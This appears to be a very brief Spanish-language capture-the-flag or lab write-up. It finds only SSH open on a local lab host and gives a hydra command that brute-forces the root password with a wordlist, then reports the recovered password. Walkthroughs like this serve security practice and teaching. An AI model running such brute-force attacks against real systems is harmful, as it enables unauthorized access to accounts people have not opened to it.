## Reconocimiento:

Puerto 22 : SSH

No hay ningún dato interesante y probé fuerza bruta directo a root:

```bash
hydra -l root -P WORDLIST ssh://172.17.0.2 -t 64 -I
```

Pass = estrella

Listo.
